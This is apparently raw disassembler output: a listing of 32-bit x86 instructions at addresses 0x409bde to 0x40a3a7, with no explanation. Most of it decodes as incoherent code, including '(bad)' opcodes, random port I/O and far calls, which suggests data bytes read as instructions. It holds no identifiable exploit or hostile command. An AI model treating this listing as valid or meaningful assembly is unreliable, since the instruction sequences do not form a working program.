  409bde:	adc    al,BYTE PTR [ebp-0x5a43804e]
  409be4:	adc    al,0x3c
  409be6:	jb     0x409bb8
  409be8:	dec    esi
  409be9:	ss nop
  409beb:	pop    ecx
  409bec:	inc    ebx
  409bed:	mov    ?,WORD PTR [ebx+0x53]
  409bf0:	arpl   WORD PTR [edx+0x19ebe449],di
  409bf6:	test   DWORD PTR [edi+eax*1],ebp
  409bf9:	(bad)  
  409bfa:	(bad)  
  409bfb:	std    
  409bfc:	je     0x409bf7
  409bfe:	call   0xcf1cbf75
  409c03:	cmc    
  409c04:	outs   dx,BYTE PTR ds:[esi]
  409c05:	mov    eax,0x50f9bdf4
  409c0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c0b:	inc    edx
  409c0c:	and    esi,DWORD PTR [ecx]
  409c0e:	stos   DWORD PTR es:[edi],eax
  409c0f:	jnp    0x409c90
  409c11:	das    
  409c12:	int    0x1b
  409c14:	repnz pop edx
  409c16:	aam    0xe2
  409c18:	dec    ecx
  409c19:	adc    ch,BYTE PTR [esi+0x417124a0]
  409c1f:	xlat   BYTE PTR ds:[ebx]
  409c20:	add    BYTE PTR [edi],dh
  409c22:	pusha  
  409c23:	pop    ss
  409c24:	std    
  409c25:	jmp    DWORD PTR es:[ebx+0x6d]
  409c29:	pop    ds
  409c2a:	sub    dl,BYTE PTR [ecx]
  409c2c:	mov    ch,0x46
  409c2e:	push   edx
  409c2f:	and    al,0x5a
  409c31:	jmp    0x409c13
  409c33:	outs   dx,DWORD PTR ds:[esi]
  409c34:	fldcw  WORD PTR [eax+ecx*2-0x50]
  409c38:	in     al,0xae
  409c3a:	push   cs
  409c3b:	daa    
  409c3c:	shl    BYTE PTR [ebx],1
  409c3e:	(bad)  
  409c3f:	xor    edx,edx
  409c41:	jmp    0x40a1cb
  409c46:	into   
  409c47:	icebp  
  409c48:	test   DWORD PTR [ecx+ebp*1+0x6ce82e28],ebp
  409c4f:	dec    eax
  409c50:	push   edx
  409c51:	mov    dl,0x25
  409c53:	(bad)  
  409c54:	pop    eax
  409c55:	mov    dl,0x2
  409c57:	sub    DWORD PTR [esi],edx
  409c59:	push   ss
  409c5a:	cmp    eax,0x81161604
  409c5f:	(bad)  
  409c61:	out    0x84,eax
  409c63:	inc    esi
  409c64:	and    al,0x18
  409c66:	call   0x41b0:0xb2d202e5
  409c6d:	popa   
  409c6e:	jle    0x409c90
  409c70:	pop    eax
  409c71:	jne    0x409c59
  409c73:	rol    DWORD PTR [ebp-0x3047ab17],1
  409c79:	pop    esi
  409c7a:	adc    al,0xe6
  409c7c:	int3   
  409c7d:	mov    ds:0x4445062c,eax
  409c82:	not    ah
  409c84:	add    edi,DWORD PTR [ecx+0x26]
  409c87:	cli    
  409c88:	xchg   esi,eax
  409c89:	jg     0x409c7f
  409c8b:	jge    0x409d09
  409c8d:	popf   
  409c8e:	inc    esi
  409c8f:	leave  
  409c90:	(bad)  
  409c91:	xchg   edi,eax
  409c92:	call   0xad07:0xebce8940
  409c99:	jl     0x409d08
  409c9b:	ret    
  409c9c:	push   0x68
  409c9e:	and    ecx,0x26
  409ca1:	in     al,dx
  409ca2:	jbe    0x409cf4
  409ca4:	js     0x409c36
  409ca6:	and    bl,BYTE PTR [ebx]
  409ca8:	aas    
  409ca9:	fcomip st,st(0)
  409cab:	jg     0x409c46
  409cad:	mov    cl,0x5d
  409caf:	arpl   di,cx
  409cb1:	cmp    BYTE PTR [esi],ch
  409cb3:	aas    
  409cb4:	aaa    
  409cb5:	xchg   esp,eax
  409cb6:	mov    ebx,0xa8619baa
  409cbb:	(bad)
  409cbf:	sub    eax,0xb8c196a4
  409cc4:	jne    0x409c85
  409cc6:	ffree  st(2)
  409cc8:	jbe    0x409d0b
  409cca:	add    edx,DWORD PTR [edx-0x21a08806]
  409cd0:	dec    eax
  409cd1:	cmp    al,0x57
  409cd3:	ror    ebx,cl
  409cd5:	xchg   edi,eax
  409cd6:	icebp  
  409cd7:	call   0xa95c:0xe0e01e9a
  409cde:	inc    edx
  409cdf:	jbe    0x409cf1
  409ce1:	add    bh,ch
  409ce3:	std    
  409ce4:	jae    0x409cfb
  409ce6:	inc    ebp
  409ce7:	mov    BYTE PTR [ebx+0x5b],dh
  409cea:	adc    esp,DWORD PTR [ebx+0x436ab536]
  409cf0:	xlat   BYTE PTR ds:[ebx]
  409cf1:	and    ah,ah
  409cf3:	dec    BYTE PTR [esi+0x5b]
  409cf6:	pop    ebp
  409cf7:	inc    esp
  409cf8:	retf   0x7114
  409cfb:	std    
  409cfc:	xor    BYTE PTR [ebp-0x3f558383],0x68
  409d03:	mov    ch,0xc3
  409d05:	jmp    0x151a:0x7e4ab329
  409d0c:	cdq    
  409d0d:	iret   
  409d0e:	std    
  409d0f:	daa    
  409d10:	dec    esp
  409d11:	hlt    
  409d12:	jb     0x409d1d
  409d14:	sub    DWORD PTR [ecx-0x648be987],edx
  409d1a:	jge    0x409d82
  409d1c:	imul   ebx,DWORD PTR [ebp+0x20],0x53842f6b
  409d23:	or     al,0x60
  409d25:	test   eax,0xf8a53dc4
  409d2a:	and    BYTE PTR [edx+0x4b],dl
  409d2d:	clc    
  409d2e:	sbb    al,0x22
  409d30:	xor    DWORD PTR [esi-0x1f1cfa1a],0xffffff9b
  409d37:	sahf   
  409d38:	mov    eax,0x73fcc8f
  409d3d:	mov    al,0x4b
  409d3f:	cmp    ecx,esi
  409d41:	sar    DWORD PTR [edx+ebx*1-0x5060dadc],1
  409d48:	(bad)  
  409d4a:	and    DWORD PTR [eax-0x79fa27da],0x72
  409d51:	or     eax,0x5bdb93f5
  409d56:	fist   DWORD PTR [esi]
  409d58:	inc    ebp
  409d59:	or     BYTE PTR [eax-0x29],0xd8
  409d5d:	sar    cl,cl
  409d5f:	fiadd  DWORD PTR [edx+0x7c83015d]
  409d65:	mov    dh,0xc
  409d67:	cmp    DWORD PTR [ebx],0x50
  409d6a:	push   ecx
  409d6b:	mov    ebx,0x1f83e927
  409d70:	call   0xd65983
  409d75:	aas    
  409d76:	xlat   BYTE PTR ds:[ebx]
  409d77:	mov    ds:0xd50f9a1f,al
  409d7c:	in     eax,0xb9
  409d7e:	push   esp
  409d7f:	popa   
  409d80:	(bad)  
  409d81:	and    eax,0xaa88cf4
  409d86:	xchg   esp,eax
  409d87:	loope  0x409d59
  409d89:	sar    DWORD PTR [esi+0x5d],1
  409d8c:	jle    0x44c495bf
  409d92:	dec    ebx
  409d93:	jnp    0x409d90
  409d95:	cmp    ah,BYTE PTR [ebp-0xb]
  409d98:	inc    ebx
  409d99:	popf   
  409d9a:	jmp    0x409dc2
  409d9c:	mov    eax,ds:0x32258b42
  409da1:	fadd   QWORD PTR [edx]
  409da3:	pop    eax
  409da4:	(bad)  
  409da5:	mov    esi,0x7e8f6333
  409daa:	mov    edi,0x57466826
  409daf:	xchg   edx,eax
  409db0:	ins    BYTE PTR es:[edi],dx
  409db1:	jne    0x409dd0
  409db3:	jns    0x409d9b
  409db5:	call   0x11a71374
  409dba:	mov    edi,0x8e931b20
  409dbf:	dec    esp
  409dc0:	ret    
  409dc1:	ins    BYTE PTR es:[edi],dx
  409dc2:	cmp    dh,BYTE PTR [esi+eiz*8+0x48712d9c]
  409dc9:	mov    edi,0xa3925398
  409dce:	repz je 0x409da9
  409dd1:	add    DWORD PTR [ebp-0x66],edx
  409dd4:	push   ds
  409dd5:	cld    
  409dd6:	cli    
  409dd7:	mov    eax,ds:0xd9997627
  409ddc:	test   DWORD PTR [eax*8+0x64706681],edi
  409de3:	jnp    0x409df0
  409de5:	into   
  409de6:	mov    eax,ds
  409de8:	fs mov cl,dh
  409deb:	and    al,0x2e
  409ded:	cwde   
  409dee:	jno    0x409e6f
  409df0:	add    edi,DWORD PTR ss:[ebp-0x6769be71]
  409df7:	inc    edi
  409df8:	mov    bl,0x78
  409dfa:	lods   al,BYTE PTR ds:[esi]
  409dfb:	mov    DWORD PTR [esi],0xf9f4e52a
  409e01:	push   es
  409e02:	clc    
  409e03:	js     0x409dc5
  409e05:	adc    eax,0x27febf4
  409e0a:	and    DWORD PTR [ecx+0x68a0de89],esi
  409e10:	mov    ecx,0xeb6ffb19
  409e15:	sbb    ch,BYTE PTR [ebx]
  409e17:	mov    esp,0xeb792b
  409e1c:	push   cs
  409e1d:	cs es out dx,eax
  409e20:	cmp    eax,0xfc659725
  409e25:	mov    eax,ds:0x810e7cdd
  409e2a:	mov    ecx,0xeaf0576b
  409e2f:	jp     0x409e16
  409e31:	jmp    0x53af:0xfb616071
  409e38:	test   eax,0xaa214e5d
  409e3d:	mov    ch,0xb2
  409e3f:	or     eax,0xb48f1a25
  409e44:	mov    ebx,0xc078e874
  409e49:	push   edi
  409e4a:	sub    bh,BYTE PTR [esi-0x3c]
  409e4d:	or     ecx,edx
  409e4f:	ret    0x9005
  409e52:	jns    0x409e18
  409e54:	add    ecx,edx
  409e56:	out    0x6b,eax
  409e58:	fidivr WORD PTR [ebx+ebp*8-0x1d4ab43f]
  409e5f:	xor    dh,BYTE PTR [esi-0x72ba519]
  409e65:	mov    esp,0xc614b50a
  409e6a:	sub    al,BYTE PTR [ebx]
  409e6c:	shl    BYTE PTR [eax+0x2968d2d4],1
  409e72:	mov    esi,esp
  409e74:	mov    esi,0x7dc1f759
  409e79:	cs mov dl,0x6a
  409e7c:	inc    ebx
  409e7d:	call   0xe396:0xfea69f26
  409e84:	mov    cl,0x9a
  409e86:	mov    ebp,0xf342bc3a
  409e8b:	cmc    
  409e8c:	mov    dl,0x8c
  409e8e:	or     eax,0x67ef9054
  409e93:	mov    WORD PTR [ecx+0x6d9e1657],gs
  409e99:	push   0xffffffd1
  409e9b:	inc    ebx
  409e9c:	or     eax,0xe2589f8f
  409ea1:	jbe    0x409e50
  409ea3:	loope  0x409e70
  409ea5:	je     0x409e81
  409ea7:	fdivr  QWORD PTR [esi]
  409ea9:	jmp    0x9763:0x495c9cc5
  409eb0:	lahf   
  409eb1:	push   esp
  409eb2:	fcmovnbe st,st(5)
  409eb4:	cmp    eax,0x6bd675c7
  409eb9:	cli    
  409eba:	imul   eax,DWORD PTR [edi],0xffffff88
  409ebd:	imul   edx,DWORD PTR [edi],0xa0eca86
  409ec3:	pop    edi
  409ec4:	dec    eax
  409ec5:	fisttp DWORD PTR [esi+0x6d]
  409ec8:	inc    edx
  409ec9:	lods   eax,DWORD PTR ds:[esi]
  409eca:	cs pop edi
  409ecc:	retf   
  409ecd:	xor    edx,ecx
  409ecf:	jl     0x409f49
  409ed1:	rcr    DWORD PTR [ecx],0x64
  409ed4:	lea    edx,[edx-0x16f3d08b]
  409eda:	dec    edi
  409edb:	cs mov cl,0x10
  409ede:	iret   
  409edf:	xchg   ecx,eax
  409ee0:	sub    edi,DWORD PTR [ecx+0x4369f86]
  409ee6:	jne    0x409ea0
  409ee8:	xor    dh,ch
  409eea:	into   
  409eeb:	fmul   DWORD PTR [edi-0x63f30622]
  409ef1:	lock dec ebp
  409ef3:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  409ef5:	push   0x4e27f598
  409efa:	adc    esi,ebx
  409efc:	outs   dx,DWORD PTR ds:[esi]
  409efd:	mov    edx,0xefd59b0
  409f02:	out    0xa9,eax
  409f04:	fs call 0x7b1a5bd6
  409f0a:	pop    esi
  409f0b:	xchg   ebp,eax
  409f0c:	inc    DWORD PTR [edi]
  409f0e:	(bad)  [edx-0x7be6c8f4]
  409f14:	sub    BYTE PTR [esi+ecx*4+0x31],0xc3
  409f19:	push   ss
  409f1a:	mov    dl,0x36
  409f1c:	push   ss
  409f1d:	push   ss
  409f1e:	and    edi,DWORD PTR [ecx]
  409f20:	je     0x409f2f
  409f22:	(bad)  
  409f23:	mov    dh,0x45
  409f25:	and    al,BYTE PTR [eax]
  409f27:	mov    cl,0x5f
  409f29:	mov    bl,0xcc
  409f2b:	adc    eax,0x3b58b11c
  409f30:	sar    BYTE PTR [edi],1
  409f32:	pop    es
  409f33:	add    ebx,edx
  409f35:	fiadd  DWORD PTR [edi+0x75]
  409f38:	pop    edx
  409f39:	(bad)  
  409f3b:	into   
  409f3c:	iret   
  409f3d:	loopne 0x409f6d
  409f3f:	icebp  
  409f40:	enter  0x869a,0x89
  409f44:	sbb    eax,0x1292b1fe
  409f49:	pop    ds
  409f4a:	xor    al,0xf
  409f4c:	fwait
  409f4d:	sub    eax,0xa802e653
  409f52:	(bad)  
  409f53:	in     eax,0x88
  409f55:	les    ebp,FWORD PTR [ebx]
  409f57:	gs jl  0x409ef8
  409f5a:	rcl    DWORD PTR [edx+0x22],0x61
  409f5e:	jmp    0x409f27
  409f60:	aas    
  409f61:	and    DWORD PTR [eax],edi
  409f63:	inc    esp
  409f64:	cmp    DWORD PTR [ebx-0x32],ebp
  409f67:	cld    
  409f68:	imul   DWORD PTR [edi+0x17]
  409f6b:	mov    edx,0xa746269d
  409f70:	mov    cl,0xa2
  409f72:	lock ret 0x3e12
  409f76:	mov    eax,ds:0x9de0a56d
  409f7b:	xor    edx,DWORD PTR [ebx]
  409f7d:	popf   
  409f7e:	mov    DWORD PTR [ecx-0x6e],ebx
  409f81:	ins    DWORD PTR es:[edi],dx
  409f82:	inc    ebp
  409f83:	arpl   WORD PTR ds:0x98b88ee9,cx
  409f89:	fwait
  409f8a:	xchg   cl,dl
  409f8c:	xchg   ecx,eax
  409f8d:	add    dl,BYTE PTR [esi-0x136c63e8]
  409f93:	sub    al,0x8d
  409f95:	push   es
  409f96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409f97:	cmp    dl,BYTE PTR [ecx+0x51]
  409f9a:	sti    
  409f9b:	popf   
  409f9c:	xchg   ecx,eax
  409f9d:	push   edi
  409f9e:	mov    ds:0x4e6a4211,eax
  409fa3:	pop    eax
  409fa4:	lock iret 
  409fa6:	adc    edx,edx
  409fa8:	xor    cl,0xb9
  409fab:	adc    DWORD PTR [ecx+0x67bf1592],eax
  409fb1:	cmp    bh,bl
  409fb3:	ret    0x6589
  409fb6:	xchg   BYTE PTR [edi+edi*2-0x2e],cl
  409fba:	mov    dl,0xf2
  409fbc:	jmp    0x2f8e:0xd37217b6
  409fc3:	in     eax,0x37
  409fc5:	jg     0x409ff8
  409fc7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409fc8:	mov    bh,0x25
  409fca:	pop    eax
  409fcb:	sti    
  409fcc:	xchg   ebp,eax
  409fcd:	int3   
  409fce:	pop    ds
  409fcf:	sahf   
  409fd0:	cmp    eax,0xd2005cd9
  409fd5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409fd6:	mov    al,0xa7
  409fd8:	imul   ebx,DWORD PTR [ecx+0x230caddb],0x48
  409fdf:	mov    BYTE PTR [bp+si+0x14],bl
  409fe3:	dec    esp
  409fe4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409fe5:	sub    BYTE PTR [edi-0x1e08e665],dh
  409feb:	pop    edx
  409fec:	cdq    
  409fed:	jg     0x40a021
  409fef:	cwde   
  409ff0:	mov    WORD PTR ds:0x8a749cff,ds
  409ff6:	shl    BYTE PTR [eax+0x56b55471],cl
  409ffc:	(bad)  
  409ffe:	call   0xc4d0:0x7d2cdb30
  40a005:	xor    edx,esp
  40a007:	mov    ah,0xce
  40a009:	inc    esp
  40a00a:	outs   dx,BYTE PTR ds:[esi]
  40a00b:	int    0xaf
  40a00d:	ins    DWORD PTR es:[edi],dx
  40a00e:	or     edi,DWORD PTR [esp+esi*8+0x31]
  40a012:	pop    ebx
  40a013:	sub    eax,0x60f9cc42
  40a018:	pushf  
  40a019:	inc    esp
  40a01a:	push   es
  40a01b:	int3   
  40a01c:	in     al,0xeb
  40a01e:	scas   al,BYTE PTR es:[edi]
  40a01f:	enter  0xfdcb,0x8f
  40a023:	xchg   edi,eax
  40a024:	sub    bl,BYTE PTR ds:0xd3b149d4
  40a02a:	fisubr WORD PTR [edi+ebx*1-0x3c0c4eb0]
  40a031:	mov    dl,BYTE PTR [ebx-0x40]
  40a034:	lahf   
  40a035:	sbb    BYTE PTR [esi-0x5e7285d0],al
  40a03b:	dec    ecx
  40a03c:	pop    es
  40a03d:	jbe    0x409fd2
  40a03f:	pop    ss
  40a040:	or     esi,edi
  40a042:	std    
  40a043:	sub    eax,0x9c565c8b
  40a048:	xor    esp,DWORD PTR [edx-0x73]
  40a04b:	xor    edi,esp
  40a04d:	sbb    ch,dh
  40a04f:	fdivp  st(2),st
  40a051:	sub    BYTE PTR [edx+0x486276fa],cl
  40a057:	sub    ebx,DWORD PTR [ecx]
  40a059:	mov    esp,0xe7f536c7
  40a05e:	rcl    dl,0x29
  40a061:	xchg   ebp,eax
  40a062:	xchg   esp,eax
  40a063:	push   ds
  40a064:	(bad)  
  40a065:	stc    
  40a066:	xor    DWORD PTR [esi+0x41427bd7],0x6ad068de
  40a070:	icebp  
  40a071:	mov    dl,0x71
  40a073:	xchg   ebx,eax
  40a074:	int3   
  40a075:	mov    ds:0x630b8e0f,al
  40a07a:	(bad)  
  40a07b:	mov    ebp,0xb999e4bc
  40a080:	aaa    
  40a081:	cwde   
  40a082:	xlat   BYTE PTR ds:[ebx]
  40a083:	cmp    al,0x7b
  40a085:	xchg   esi,eax
  40a086:	push   eax
  40a088:	jecxz  0x40a095
  40a08a:	adc    ah,dh
  40a08c:	or     DWORD PTR [edi+0x13ef4957],ebx
  40a092:	(bad)  
  40a093:	cmp    DWORD PTR [eax+0x75],ebp
  40a096:	icebp  
  40a097:	inc    ebp
  40a098:	sti    
  40a099:	sbb    esi,edx
  40a09b:	adc    dh,BYTE PTR ds:0x8ea51b2a
  40a0a1:	mov    eax,ds:0x68eeaaab
  40a0a6:	lods   eax,DWORD PTR ds:[esi]
  40a0a7:	push   esp
  40a0a8:	xor    DWORD PTR [ebx-0x50],0xfb795405
  40a0af:	out    dx,eax
  40a0b0:	push   ecx
  40a0b1:	test   al,0xe0
  40a0b3:	call   0x67ca:0x1715a226
  40a0ba:	jle    0x40a120
  40a0bc:	dec    ecx
  40a0bd:	pop    ss
  40a0be:	test   DWORD PTR [esi+edx*1],0x8bec0516
  40a0c5:	push   esi
  40a0c6:	repz cmp al,0x6f
  40a0c9:	jmp    0xf3fa0425
  40a0ce:	in     al,0x28
  40a0d0:	in     al,0xde
  40a0d2:	fucomi st,st(0)
  40a0d4:	sub    eax,0x8867e2a0
  40a0d9:	inc    esp
  40a0da:	xor    edi,DWORD PTR [ebp+esi*4-0x7174c576]
  40a0e1:	jecxz  0x40a078
  40a0e3:	cmp    DWORD PTR [esp+eax*2],edi
  40a0e6:	popa   
  40a0e7:	inc    ecx
  40a0e8:	aaa    
  40a0e9:	xor    edx,DWORD PTR [ebx-0x7a]
  40a0ec:	pop    edi
  40a0ed:	outs   dx,BYTE PTR ds:[esi]
  40a0ee:	daa    
  40a0ef:	dec    esp
  40a0f0:	(bad)  
  40a0f1:	jp     0x40a0a4
  40a0f3:	add    edx,ecx
  40a0f5:	mov    dh,0xa3
  40a0f7:	sub    DWORD PTR [esi],edx
  40a0f9:	sbb    eax,DWORD PTR [ecx+0x62dc60cf]
  40a0ff:	inc    edx
  40a100:	das    
  40a101:	mov    edi,DWORD PTR [edx+0x2616e7c3]
  40a107:	addr16 mov edx,0x90007fa8
  40a10d:	mov    edi,0xb9f8da81
  40a112:	add    edi,DWORD PTR [esi]
  40a114:	cmc    
  40a115:	lahf   
  40a116:	mov    esi,0x23837895
  40a11b:	popf   
  40a11c:	mov    ecx,0x5ad2665f
  40a121:	cmp    al,0x27
  40a123:	stc    
  40a124:	test   BYTE PTR [eax-0x8],al
  40a127:	scas   eax,DWORD PTR es:[edi]
  40a128:	cld    
  40a129:	sub    al,0xd7
  40a12b:	out    0x6e,al
  40a12d:	sub    bl,ch
  40a12f:	outs   dx,BYTE PTR ds:[esi]
  40a130:	js     0x40a1ab
  40a132:	cwde   
  40a133:	and    BYTE PTR ss:[bp+0x25d7],al
  40a139:	stos   DWORD PTR es:[edi],eax
  40a13a:	pop    esi
  40a13b:	mov    bh,0xe8
  40a13d:	sar    edx,0xae
  40a140:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a141:	inc    esi
  40a142:	pop    ebx
  40a143:	jo     0x40a199
  40a145:	repnz push cx
  40a148:	cwde   
  40a149:	or     al,0xc1
  40a14b:	inc    ebp
  40a14d:	loope  0x40a174
  40a14f:	jge    0x40a139
  40a151:	inc    edi
  40a152:	scas   al,BYTE PTR es:[edi]
  40a153:	test   DWORD PTR [eax+edx*8+0x60],eax
  40a157:	sti    
  40a158:	inc    edi
  40a159:	sbb    eax,0xf4755eb4
  40a15e:	sbb    bl,BYTE PTR [ecx+0x1bc7f8e6]
  40a164:	in     al,dx
  40a165:	fnstenv [esi]
  40a167:	out    dx,eax
  40a168:	test   BYTE PTR [edi+ebx*2-0x40472bd3],cl
  40a16f:	mov    eax,ds:0xfb2c201f
  40a174:	(bad)  [ebx-0x2a]
  40a177:	stos   BYTE PTR es:[edi],al
  40a178:	mov    ds:0x193ba79d,eax
  40a17d:	xor    bh,BYTE PTR [ebp+0x5b3b4564]
  40a183:	adc    al,0xbf
  40a185:	arpl   WORD PTR [edi+0x5f172746],dx
  40a18b:	les    esp,FWORD PTR [esi+0x68]
  40a18e:	xchg   BYTE PTR [edi+0x4ebf21b3],al
  40a194:	aaa    
  40a195:	rol    BYTE PTR [edx-0x7b06c8b1],0xd
  40a19c:	fisttp DWORD PTR [eax]
  40a19e:	in     al,0x95
  40a1a0:	jle    0x40a175
  40a1a2:	(bad)  
  40a1a3:	mov    dl,0x7d
  40a1a5:	xchg   esp,eax
  40a1a6:	pop    es
  40a1a7:	ins    DWORD PTR es:[edi],dx
  40a1a8:	shr    DWORD PTR [edi],1
  40a1aa:	cmp    BYTE PTR [eax+0x7a875757],bh
  40a1b0:	or     al,0x4e
  40a1b2:	mov    BYTE PTR [ecx+0x56],ah
  40a1b5:	es mov dl,0x54
  40a1b8:	mov    cl,0x3c
  40a1ba:	sti    
  40a1bb:	cmp    cl,dl
  40a1bd:	jle    0x40a13f
  40a1bf:	xchg   ebp,eax
  40a1c0:	sahf   
  40a1c1:	cld    
  40a1c2:	popa   
  40a1c3:	leave  
  40a1c4:	mov    dh,0xd5
  40a1c6:	inc    ebx
  40a1c7:	lods   al,BYTE PTR ds:[esi]
  40a1c8:	out    0x24,eax
  40a1ca:	or     DWORD PTR [ebx],0x80c8ac2
  40a1d0:	mov    eax,DWORD PTR [ebp-0x34]
  40a1d3:	or     BYTE PTR [eax],cl
  40a1d5:	mov    eax,DWORD PTR [ebp-0x10]
  40a1d8:	mov    ecx,DWORD PTR [ebp-0xc]
  40a1db:	shrd   eax,ecx,0x2
  40a1df:	shr    ecx,0x2
  40a1e2:	mov    ecx,DWORD PTR [ebp-0x10]
  40a1e5:	mov    edx,DWORD PTR [ebp-0xc]
  40a1e8:	xor    eax,edi
  40a1ea:	shl    ecx,0x1e
  40a1ed:	xor    edx,edx
  40a1ef:	or     eax,edx
  40a1f1:	lea    eax,[ebp+eax*1-0x4]
  40a1f5:	mov    DWORD PTR [ebp-0x34],eax
  40a1f8:	mov    eax,DWORD PTR [ebp-0x10]
  40a1fb:	mov    ecx,DWORD PTR [ebp-0xc]
  40a1fe:	shrd   eax,ecx,0x2
  40a202:	shr    ecx,0x2
  40a205:	jmp    0x40a78f
  40a20a:	sbb    eax,0xb41fb564
  40a20f:	push   ds
  40a210:	sbb    eax,0xfb6fa164
  40a215:	mov    ah,0x57
  40a217:	sbb    al,0x28
  40a219:	push   0x16161f39
  40a21e:	cmp    eax,0xd3161604
  40a223:	and    DWORD PTR [ebp+0x40b1981e],ebx
  40a229:	es cli 
  40a22b:	in     eax,dx
  40a22c:	(bad)  
  40a22d:	add    BYTE PTR [ecx-0x7a],dh
  40a230:	mov    ch,0x8b
  40a232:	dec    edx
  40a233:	adc    cl,BYTE PTR [eax+0xfd9777e]
  40a239:	vmwrite ebp,DWORD PTR [esi-0x35c6d33a]
  40a240:	pop    ds
  40a241:	or     esi,DWORD PTR [ecx+0x10]
  40a244:	hlt    
  40a245:	xor    edi,DWORD PTR [ebx]
  40a247:	pop    edi
  40a248:	lds    edx,FWORD PTR [esi+0x2cc0d7ca]
  40a24e:	jg     0x40a215
  40a250:	idiv   BYTE PTR [ebp+0x68]
  40a253:	pop    ebx
  40a254:	sub    al,0x50
  40a256:	arpl   WORD PTR [edx+0x7f],sp
  40a259:	mov    ebp,0x2449a4ac
  40a25e:	hlt    
  40a25f:	sub    al,BYTE PTR [ebp+0x60]
  40a262:	out    0x3f,eax
  40a264:	cld    
  40a265:	div    cl
  40a267:	lds    ebp,FWORD PTR [esi+0x11ea8115]
  40a26d:	cmp    esi,esi
  40a26f:	jo     0x40a25f
  40a271:	cld    
  40a272:	dec    esp
  40a273:	arpl   WORD PTR [edx],dx
  40a275:	pop    ecx
  40a276:	fld    DWORD PTR [esi-0x24e79c5a]
  40a27c:	rol    DWORD PTR [edx+0x45],0x11
  40a280:	out    0x34,eax
  40a282:	scas   al,BYTE PTR es:[edi]
  40a283:	xor    al,0xe5
  40a285:	fidiv  DWORD PTR [esi-0x77]
  40a288:	fimul  DWORD PTR [edi-0x78d14d98]
  40a28e:	mov    eax,0x429fb8f6
  40a293:	or     edx,ebx
  40a295:	push   cs
  40a296:	ror    BYTE PTR [edi],0x17
  40a299:	test   BYTE PTR [ebx],ah
  40a29b:	pop    eax
  40a29c:	mov    WORD PTR [edx-0x6e],?
  40a29f:	or     al,0xd3
  40a2a1:	out    dx,eax
  40a2a2:	cmp    eax,0x60f125ff
  40a2a7:	in     eax,0x82
  40a2a9:	and    al,0x13
  40a2ab:	mov    edi,DWORD PTR [ecx-0x6d044601]
  40a2b1:	xchg   ebp,eax
  40a2b2:	push   ss
  40a2b3:	and    esp,ecx
  40a2b5:	mov    dh,0x54
  40a2b7:	mov    esp,DWORD PTR [edx+0xf]
  40a2ba:	mov    ch,0xec
  40a2bc:	or     ebp,DWORD PTR ds:0x3517a84c
  40a2c2:	ds aaa 
  40a2c4:	in     eax,0x6
  40a2c6:	cli    
  40a2c7:	add    al,0xf0
  40a2c9:	dec    ebp
  40a2ca:	adc    dh,cl
  40a2cc:	(bad)  
  40a2cd:	call   0x5850:0xcd21f45c
  40a2d4:	lahf   
  40a2d5:	(bad)
  40a2d8:	(bad)  
  40a2da:	out    dx,al
  40a2db:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a2dc:	stos   DWORD PTR es:[edi],eax
  40a2dd:	dec    edi
  40a2de:	pop    ss
  40a2df:	push   ebp
  40a2e0:	retf   
  40a2e1:	aad    0x25
  40a2e3:	push   es
  40a2e4:	stc    
  40a2e5:	hlt    
  40a2e6:	xor    edx,edi
  40a2e8:	lds    esi,FWORD PTR [edi-0x61]
  40a2eb:	leave  
  40a2ec:	into   
  40a2ed:	add    al,0x62
  40a2ef:	mov    al,BYTE PTR [ebx-0x184011fa]
  40a2f5:	dec    ebp
  40a2f6:	jge    0x40a311
  40a2f8:	push   ecx
  40a2f9:	lahf   
  40a2fa:	popf   
  40a2fb:	cmp    ecx,DWORD PTR [edi]
  40a2fd:	aaa    
  40a2fe:	and    DWORD PTR ds:0x2ed681a1,esi
  40a304:	cmp    al,0xe1
  40a306:	fidivr WORD PTR [edx-0x5dec72ab]
  40a30c:	icebp  
  40a30d:	pushf  
  40a30e:	lahf   
  40a30f:	ret    
  40a310:	cmp    al,0x4a
  40a312:	es (bad) 
  40a314:	mov    al,0x4d
  40a316:	push   edx
  40a317:	adc    BYTE PTR [ecx-0xb],ch
  40a31a:	push   esi
  40a31b:	and    BYTE PTR [eax+0x66],cl
  40a31e:	shl    eax,0x64
  40a321:	call   0x5c09:0xc59120bc
  40a328:	imul   edx,ecx,0x69
  40a32b:	retf   
  40a32c:	into   
  40a32d:	pop    ebp
  40a32e:	dec    eax
  40a32f:	ficomp DWORD PTR [ebp+0x56]
  40a332:	or     edi,edx
  40a334:	push   edx
  40a335:	outs   dx,DWORD PTR ds:[esi]
  40a336:	inc    eax
  40a337:	in     al,dx
  40a338:	lods   eax,DWORD PTR ds:[esi]
  40a339:	mov    DWORD PTR [edi],0xbedfd667
  40a33f:	cmp    eax,0xd3050dea
  40a344:	mov    dh,0x9d
  40a346:	iret   
  40a347:	jb     0x40a3c1
  40a349:	jb     0x40a325
  40a34b:	inc    ebp
  40a34c:	fdiv   QWORD PTR [ecx+0x4b210dc]
  40a352:	les    ebp,FWORD PTR [edx-0x22]
  40a355:	ds ins DWORD PTR es:[edi],dx
  40a357:	add    DWORD PTR [eax-0x26],eax
  40a35a:	jmp    0xbedf37a7
  40a35f:	inc    edi
  40a360:	je     0x40a375
  40a362:	cmp    eax,0x89918a1e
  40a367:	push   edi
  40a368:	mov    ds:0x5be64407,al
  40a36d:	imul   edx,DWORD PTR [eax+0x5c],0xffffffe4
  40a371:	ins    DWORD PTR es:[edi],dx
  40a372:	sub    ecx,esi
  40a374:	mov    bh,0x33
  40a376:	test   al,0xfd
  40a378:	and    WORD PTR [edx+0x59],ax
  40a37c:	mov    esp,0xee9d7acb
  40a381:	cmp    bl,BYTE PTR [eax+0x38]
  40a384:	push   ds
  40a385:	cld    
  40a386:	nop
  40a387:	outs   dx,DWORD PTR ds:[esi]
  40a388:	or     BYTE PTR [ebp*4-0x661f7674],al
  40a38f:	sub    al,0x82
  40a391:	mov    al,ds:0x97ca6c58
  40a397:	shl    BYTE PTR [ebx-0x73],0xae
  40a39b:	mov    edi,0x8d4f951e
  40a3a0:	rcl    DWORD PTR [esi+0x243d0f03],1
  40a3a6:	xlat   BYTE PTR ds:[ebx]
  40a3a7:	push   0xbf378afe
